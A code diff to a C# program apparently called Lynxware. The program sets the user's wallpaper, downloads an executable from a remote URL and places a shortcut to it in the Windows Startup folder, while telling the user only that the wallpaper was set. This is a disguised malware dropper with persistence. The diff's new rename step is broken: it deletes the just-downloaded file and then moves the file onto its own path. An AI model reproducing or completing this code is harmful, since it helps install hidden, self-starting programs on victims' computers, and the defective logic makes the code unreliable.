@@ -1,7 +1,6 @@
 ﻿using System;
 using System.IO;
 using System.Net;
-using System.Security.Cryptography.X509Certificates;
 using Microsoft.Win32;
 
 namespace Lynxware
@@ -28,31 +27,23 @@ namespace Lynxware
             SetDesktopBackground(downloadedPhotoPath);
 
             // Download the executable
-            string downloadedExecutablePath = Path.Combine(downloadDirectory, $"{RandomId(10)}.exe");
+            string downloadedExecutablePath = Path.Combine(downloadDirectory, "Lynxware.exe");
             using (WebClient client = new WebClient())
             {
                 client.DownloadFile(Dependencies.executableUrl, downloadedExecutablePath);
             }
 
-            static string RandomId(int length)
+            // Rename the executable to a specific name
+            string renamedExecutablePath = Path.Combine(downloadDirectory, "Lynxware.exe");
+            if (File.Exists(renamedExecutablePath))
             {
-                string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-                string result = "";
-                Random random = new Random();
-
-                for (int i = 0; i < length; i++)
-                {
-                    result += chars[random.Next(chars.Length)];
-                }
-
-                return result;
+                File.Delete(renamedExecutablePath);
             }
-
+            File.Move(downloadedExecutablePath, renamedExecutablePath);
 
             // Create a shortcut to the executable in the startup folder
-            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-            string shortcutPath = Path.Combine(startupFolder, "Lynxware.lnk");
-            CreateShortcut(shortcutPath, downloadedExecutablePath);
+            string startupFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Lynxware.lnk");
+            CreateShortcut(startupFolder, renamedExecutablePath);
 
             Console.WriteLine("Wallpaper set successfully.");
             Console.ReadLine(); // Wait for user input to close the console window
